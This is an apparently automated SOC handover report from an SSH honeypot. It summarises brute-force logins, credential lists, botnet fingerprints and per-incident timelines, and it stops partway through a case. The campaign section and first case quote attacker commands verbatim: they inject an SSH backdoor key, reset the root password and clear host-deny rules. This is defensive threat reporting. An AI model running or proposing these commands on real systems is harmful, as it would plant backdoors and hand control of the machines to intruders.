# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-11 |
| **Generated At** | 2026-04-11T08:40:32Z |
| **Shift Time** | 08:40 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **60** |
| Confirmed Threats | **53** |
| False Positives Filtered | **7** (11.7%) |
| Unique Attacker IPs | **50** |
| Countries of Origin | **21** |
| High Severity Cases | **42** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **18** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **46** |
| Unique Credential Pairs | **30** |
| Unique Usernames | **4** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **42** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 43 |
| `bryan` | 1 |
| `admin` | 1 |
| `centos` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `2` | 3 |
| `Password123` | 3 |
| `root444` | 3 |
| `qwerty12345` | 3 |
| `88888888` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `2` | 3 |
| `root` | `Password123` | 3 |
| `root` | `root444` | 3 |
| `root` | `qwerty12345` | 3 |
| `root` | `88888888` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `galaxy123` | `49.247.36.49` | 2026-04-11T07:02:51 |
| `root` | `1234567` | `52.159.229.2` | 2026-04-11T07:52:27 |
| `root` | `88888888` | `65.20.135.235` | 2026-04-11T07:52:58 |
| `root` | `88888888` | `114.98.63.18` | 2026-04-11T07:53:12 |
| `root` | `2` | `112.184.56.199` | 2026-04-11T07:53:45 |
| `root` | `Password123` | `58.17.128.7` | 2026-04-11T07:54:09 |
| `root` | `Password123` | `183.109.153.176` | 2026-04-11T07:54:17 |
| `root` | `root44` | `60.116.115.158` | 2026-04-11T07:54:46 |
| `root` | `102030` | `92.84.21.186` | 2026-04-11T07:55:49 |
| `root` | `102030` | `47.211.138.149` | 2026-04-11T07:55:57 |
| `root` | `root2023` | `112.31.93.229` | 2026-04-11T07:56:25 |
| `root` | `root444` | `154.146.238.122` | 2026-04-11T07:57:06 |
| `root` | `root444` | `186.201.54.90` | 2026-04-11T07:57:14 |
| `root` | `1secret?` | `52.159.229.2` | 2026-04-11T07:59:18 |
| `root` | `stxadmin` | `102.90.34.90` | 2026-04-11T08:00:34 |
| `root` | `stxadmin` | `222.216.2.74` | 2026-04-11T08:00:42 |
| `root` | `asd12345` | `179.189.85.66` | 2026-04-11T08:01:19 |
| `root` | `asd12345` | `75.157.194.2` | 2026-04-11T08:01:27 |
| `root` | `qwerty12345` | `154.146.238.122` | 2026-04-11T08:02:07 |
| `root` | `qwerty12345` | `95.79.108.51` | 2026-04-11T08:02:18 |
| `root` | `qwerty1` | `36.64.33.82` | 2026-04-11T08:03:12 |
| `root` | `1212` | `52.159.229.2` | 2026-04-11T08:06:12 |
| `root` | `5555555` | `103.93.37.178` | 2026-04-11T08:07:26 |
| `root` | `2222` | `186.215.204.109` | 2026-04-11T08:08:44 |
| `root` | `openelec` | `190.117.96.174` | 2026-04-11T08:11:58 |
| `root` | `openelec` | `213.103.113.159` | 2026-04-11T08:12:06 |
| `root` | `1` | `116.113.241.82` | 2026-04-11T08:14:13 |
| `root` | `1` | `83.134.195.54` | 2026-04-11T08:14:20 |
| `root` | `2` | `49.124.152.249` | 2026-04-11T08:16:21 |
| `root` | `2` | `112.168.1.182` | 2026-04-11T08:16:33 |
| `root` | `Password123` | `183.3.133.47` | 2026-04-11T08:16:48 |
| `root` | `root444` | `165.22.88.35` | 2026-04-11T08:19:44 |
| `root` | `123key` | `52.159.229.2` | 2026-04-11T08:20:02 |
| `root` | `pass` | `117.159.174.136` | 2026-04-11T08:23:49 |
| `root` | `qwerty12345` | `120.198.138.185` | 2026-04-11T08:24:41 |
| `root` | `5555555` | `112.194.142.167` | 2026-04-11T08:30:05 |
| `root` | `abcd123` | `186.201.54.90` | 2026-04-11T08:32:09 |
| `root` | `abcd123` | `112.53.70.99` | 2026-04-11T08:32:19 |
| `root` | `raspberry` | `180.151.254.217` | 2026-04-11T08:32:22 |
| `root` | `qwerty1234` | `220.80.223.144` | 2026-04-11T08:33:32 |
| `root` | `1234abcd` | `82.65.140.218` | 2026-04-11T08:37:02 |
| `root` | `root2022` | `49.124.152.148` | 2026-04-11T08:37:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **60** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 39 |
| Go SSH scanner | 6 |
| libssh | 6 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 39 | 37 |
| `16443846184e...` | Generic scanner | 6 | 2 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 39 | 37 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 6 | 2 | Generic scanner |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:DjWJGixbIOLw"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `49.247.36.49`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **50** |
| Unique ASNs | **35** |
| High-Risk ASNs | **31** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (42)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-adccf27bc65d

| Field | Detail |
|---|---|
| **Source IP** | `49.247.36[.]49` |
| **First Seen** | 2026-04-11 07:02 |
| **Last Seen** | 2026-04-11 07:03 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:DjWJGixbIOLw"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:02:50` | `cowrie.session.connect` |
| `2026-04-11 07:02:50` | `cowrie.client.version` |
| `2026-04-11 07:02:50` | `cowrie.client.kex` |
| `2026-04-11 07:02:51` | `cowrie.login.success` |
| `2026-04-11 07:02:51` | `cowrie.session.params` |
| `2026-04-11 07:02:51` | `cowrie.command.input` |
| `2026-04-11 07:02:51` | `cowrie.command.failed` |
| `2026-04-11 07:02:51` | `cowrie.log.closed` |
| `2026-04-11 07:02:52` | `cowrie.session.params` |
| `2026-04-11 07:02:52` | `cowrie.command.input` |
| `2026-04-11 07:02:52` | `cowrie.session.file_download` |
| `2026-04-11 07:02:52` | `cowrie.log.closed` |
| `2026-04-11 07:03:04` | `cowrie.session.params` |
| `2026-04-11 07:03:04` | `cowrie.command.input` |
| `2026-04-11 07:03:04` | `cowrie.log.closed` |
| `2026-04-11 07:03:04` | `cowrie.session.params` |
| `2026-04-11 07:03:04` | `cowrie.command.input` |
| `2026-04-11 07:03:05` | `cowrie.log.closed` |
| `2026-04-11 07:03:05` | `cowrie.session.params` |
| `2026-04-11 07:03:05` | `cowrie.command.input` |
| `2026-04-11 07:03:05` | `cowrie.session.file_download` |
| `2026-04-11 07:03:05` | `cowrie.log.closed` |
| `2026-04-11 07:03:05` | `cowrie.session.params` |
| `2026-04-11 07:03:05` | `cowrie.command.input` |
| `2026-04-11 07:03:05` | `cowrie.log.closed` |
| `2026-04-11 07:03:06` | `cowrie.session.params` |
| `2026-04-11 07:03:06` | `cowrie.command.input` |
| `2026-04-11 07:03:06` | `cowrie.log.closed` |
| `2026-04-11 07:03:06` | `cowrie.session.params` |
| `2026-04-11 07:03:06` | `cowrie.command.input` |
| `2026-04-11 07:03:06` | `cowrie.command.input` |
| `2026-04-11 07:03:06` | `cowrie.log.closed` |
| `2026-04-11 07:03:07` | `cowrie.session.params` |
| `2026-04-11 07:03:07` | `cowrie.command.input` |
| `2026-04-11 07:03:07` | `cowrie.log.closed` |
| `2026-04-11 07:03:07` | `cowrie.session.params` |
| `2026-04-11 07:03:07` | `cowrie.command.input` |
| `2026-04-11 07:03:07` | `cowrie.log.closed` |
| `2026-04-11 07:03:08` | `cowrie.session.params` |
| `2026-04-11 07:03:08` | `cowrie.command.input` |
| `2026-04-11 07:03:08` | `cowrie.log.closed` |
| `2026-04-11 07:03:08` | `cowrie.session.params` |
| `2026-04-11 07:03:08` | `cowrie.command.input` |
| `2026-04-11 07:03:08` | `cowrie.log.closed` |
| `2026-04-11 07:03:08` | `cowrie.session.params` |
| `2026-04-11 07:03:08` | `cowrie.command.input` |
| `2026-04-11 07:03:09` | `cowrie.log.closed` |
| `2026-04-11 07:03:09` | `cowrie.session.params` |
| `2026-04-11 07:03:09` | `cowrie.command.input` |
| `2026-04-11 07:03:09` | `cowrie.log.closed` |
| `2026-04-11 07:03:09` | `cowrie.session.params` |
| `2026-04-11 07:03:09` | `cowrie.command.input` |
| `2026-04-11 07:03:09` | `cowrie.log.closed` |
| `2026-04-11 07:03:10` | `cowrie.session.params` |
| `2026-04-11 07:03:10` | `cowrie.command.input` |
| `2026-04-11 07:03:10` | `cowrie.log.closed` |
| `2026-04-11 07:03:10` | `cowrie.session.params` |
| `2026-04-11 07:03:10` | `cowrie.command.input` |
| `2026-04-11 07:03:10` | `cowrie.log.closed` |
| `2026-04-11 07:03:11` | `cowrie.session.params` |
| `2026-04-11 07:03:11` | `cowrie.command.input` |
| `2026-04-11 07:03:11` | `cowrie.log.closed` |
| `2026-04-11 07:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.247.36[.]49` to AbuseIPDB if not already reported
- [ ] Block `49.247.36[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be1b5c167590

| Field | Detail |
|---|---|
| **Source IP** | `52.159.229[.]2` |
| **First Seen** | 2026-04-11 07:52 |
| **Last Seen** | 2026-04-11 07:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `whoami` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:52:26` | `cowrie.session.connect` |
| `2026-04-11 07:52:26` | `cowrie.client.version` |
| `2026-04-11 07:52:26` | `cowrie.client.kex` |
| `2026-04-11 07:52:27` | `cowrie.login.success` |
| `2026-04-11 07:52:28` | `cowrie.session.params` |
| `2026-04-11 07:52:28` | `cowrie.command.input` |
| `2026-04-11 07:52:28` | `cowrie.log.closed` |
| `2026-04-11 07:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.159.229[.]2` to AbuseIPDB if not already reported
- [ ] Block `52.159.229[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d165abd84a2a

| Field | Detail |
|---|---|
| **Source IP** | `65.20.135[.]235` |
| **First Seen** | 2026-04-11 07:52 |
| **Last Seen** | 2026-04-11 07:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:52:57` | `cowrie.session.connect` |
| `2026-04-11 07:52:57` | `cowrie.client.version` |
| `2026-04-11 07:52:57` | `cowrie.client.kex` |
| `2026-04-11 07:52:58` | `cowrie.login.success` |
| `2026-04-11 07:52:58` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.135[.]235` to AbuseIPDB if not already reported
- [ ] Block `65.20.135[.]235` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577b7a74e557

| Field | Detail |
|---|---|
| **Source IP** | `114.98.63[.]18` |
| **First Seen** | 2026-04-11 07:53 |
| **Last Seen** | 2026-04-11 07:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:53:07` | `cowrie.session.connect` |
| `2026-04-11 07:53:09` | `cowrie.client.version` |
| `2026-04-11 07:53:09` | `cowrie.client.kex` |
| `2026-04-11 07:53:12` | `cowrie.login.success` |
| `2026-04-11 07:53:13` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.63[.]18` to AbuseIPDB if not already reported
- [ ] Block `114.98.63[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a6fa704cd6e

| Field | Detail |
|---|---|
| **Source IP** | `112.184.56[.]199` |
| **First Seen** | 2026-04-11 07:53 |
| **Last Seen** | 2026-04-11 07:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:53:42` | `cowrie.session.connect` |
| `2026-04-11 07:53:43` | `cowrie.client.version` |
| `2026-04-11 07:53:43` | `cowrie.client.kex` |
| `2026-04-11 07:53:45` | `cowrie.login.success` |
| `2026-04-11 07:53:46` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.184.56[.]199` to AbuseIPDB if not already reported
- [ ] Block `112.184.56[.]199` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f56a8ea01fb3

| Field | Detail |
|---|---|
| **Source IP** | `58.17.128[.]7` |
| **First Seen** | 2026-04-11 07:54 |
| **Last Seen** | 2026-04-11 07:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:54:07` | `cowrie.session.connect` |
| `2026-04-11 07:54:07` | `cowrie.client.version` |
| `2026-04-11 07:54:07` | `cowrie.client.kex` |
| `2026-04-11 07:54:09` | `cowrie.login.success` |
| `2026-04-11 07:54:09` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.17.128[.]7` to AbuseIPDB if not already reported
- [ ] Block `58.17.128[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf49dd26864

| Field | Detail |
|---|---|
| **Source IP** | `183.109.153[.]176` |
| **First Seen** | 2026-04-11 07:54 |
| **Last Seen** | 2026-04-11 07:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:54:14` | `cowrie.session.connect` |
| `2026-04-11 07:54:15` | `cowrie.client.version` |
| `2026-04-11 07:54:15` | `cowrie.client.kex` |
| `2026-04-11 07:54:17` | `cowrie.login.success` |
| `2026-04-11 07:54:18` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:54:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.109.153[.]176` to AbuseIPDB if not already reported
- [ ] Block `183.109.153[.]176` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2968910dcc79

| Field | Detail |
|---|---|
| **Source IP** | `60.116.115[.]158` |
| **First Seen** | 2026-04-11 07:54 |
| **Last Seen** | 2026-04-11 07:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:54:44` | `cowrie.session.connect` |
| `2026-04-11 07:54:44` | `cowrie.client.version` |
| `2026-04-11 07:54:44` | `cowrie.client.kex` |
| `2026-04-11 07:54:46` | `cowrie.login.success` |
| `2026-04-11 07:54:47` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.116.115[.]158` to AbuseIPDB if not already reported
- [ ] Block `60.116.115[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5fb16e8075e

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-04-11 07:55 |
| **Last Seen** | 2026-04-11 07:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:55:48` | `cowrie.session.connect` |
| `2026-04-11 07:55:49` | `cowrie.client.version` |
| `2026-04-11 07:55:49` | `cowrie.client.kex` |
| `2026-04-11 07:55:49` | `cowrie.login.success` |
| `2026-04-11 07:55:50` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:55:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d041818dc38f

| Field | Detail |
|---|---|
| **Source IP** | `47.211.138[.]149` |
| **First Seen** | 2026-04-11 07:55 |
| **Last Seen** | 2026-04-11 07:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:55:55` | `cowrie.session.connect` |
| `2026-04-11 07:55:56` | `cowrie.client.version` |
| `2026-04-11 07:55:56` | `cowrie.client.kex` |
| `2026-04-11 07:55:57` | `cowrie.login.success` |
| `2026-04-11 07:55:58` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.211.138[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.211.138[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2511d490fe2c

| Field | Detail |
|---|---|
| **Source IP** | `112.31.93[.]229` |
| **First Seen** | 2026-04-11 07:56 |
| **Last Seen** | 2026-04-11 07:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:56:22` | `cowrie.session.connect` |
| `2026-04-11 07:56:23` | `cowrie.client.version` |
| `2026-04-11 07:56:23` | `cowrie.client.kex` |
| `2026-04-11 07:56:25` | `cowrie.login.success` |
| `2026-04-11 07:56:26` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.93[.]229` to AbuseIPDB if not already reported
- [ ] Block `112.31.93[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-171de7ccb380

| Field | Detail |
|---|---|
| **Source IP** | `154.146.238[.]122` |
| **First Seen** | 2026-04-11 07:57 |
| **Last Seen** | 2026-04-11 07:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:57:05` | `cowrie.session.connect` |
| `2026-04-11 07:57:05` | `cowrie.client.version` |
| `2026-04-11 07:57:05` | `cowrie.client.kex` |
| `2026-04-11 07:57:06` | `cowrie.login.success` |
| `2026-04-11 07:57:06` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.146.238[.]122` to AbuseIPDB if not already reported
- [ ] Block `154.146.238[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4304181fd74f

| Field | Detail |
|---|---|
| **Source IP** | `186.201.54[.]90` |
| **First Seen** | 2026-04-11 07:57 |
| **Last Seen** | 2026-04-11 07:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:57:11` | `cowrie.session.connect` |
| `2026-04-11 07:57:12` | `cowrie.client.version` |
| `2026-04-11 07:57:12` | `cowrie.client.kex` |
| `2026-04-11 07:57:14` | `cowrie.login.success` |
| `2026-04-11 07:57:15` | `cowrie.direct-tcpip.request` |
| `2026-04-11 07:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.201.54[.]90` to AbuseIPDB if not already reported
- [ ] Block `186.201.54[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a5820a7e125

| Field | Detail |
|---|---|
| **Source IP** | `52.159.229[.]2` |
| **First Seen** | 2026-04-11 07:59 |
| **Last Seen** | 2026-04-11 07:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 07:59:17` | `cowrie.session.connect` |
| `2026-04-11 07:59:17` | `cowrie.client.version` |
| `2026-04-11 07:59:17` | `cowrie.client.kex` |
| `2026-04-11 07:59:18` | `cowrie.login.success` |
| `2026-04-11 07:59:19` | `cowrie.session.params` |
| `2026-04-11 07:59:19` | `cowrie.command.input` |
| `2026-04-11 07:59:19` | `cowrie.log.closed` |
| `2026-04-11 07:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.159.229[.]2` to AbuseIPDB if not already reported
- [ ] Block `52.159.229[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cf8b2cf5bb1

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-04-11 08:00 |
| **Last Seen** | 2026-04-11 08:05 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
